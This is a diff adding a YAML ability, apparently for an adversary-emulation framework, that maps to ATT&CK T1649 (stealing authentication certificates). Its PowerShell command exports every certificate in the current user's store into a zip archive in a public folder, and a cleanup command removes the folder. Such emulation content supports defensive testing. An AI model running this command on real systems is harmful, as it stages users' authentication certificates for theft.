@@ -1,0 +1,25 @@
+---
+- id: b41910e3770cff37dd642650f0d91672
+  name: Staging Local Certificates via Export-Certificate
+  description: 'Export all user certificates and add to a compressed archive.
+
+    '
+  tactic: credential-access
+  technique:
+    attack_id: T1649
+    name: Steal or Forge Authentication Certificates
+  platforms:
+    windows:
+      psh:
+        command: $archive="$env:PUBLIC\T1649\atomic_certs.zip"; $exfilpath="$env:PUBLIC\T1649\certs";
+          Add-Type -assembly "system.io.compression.filesystem"; Remove-Item $(split-path
+          $exfilpath) -Recurse -Force -ErrorAction Ignore; mkdir $exfilpath | Out-Null;
+          foreach ($cert in (gci Cert:\CurrentUser\My)) { Export-Certificate -Cert
+          $cert -FilePath $exfilpath\$($cert.FriendlyName).cer}; [io.compression.zipfile]::CreateFromDirectory($exfilpath,
+          $archive)
+        payloads: []
+        cleanup: $exfilpath="$env:PUBLIC\T1649\certs"; Remove-Item $(split-path $exfilpath)
+          -Recurse -Force -ErrorAction Ignore
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
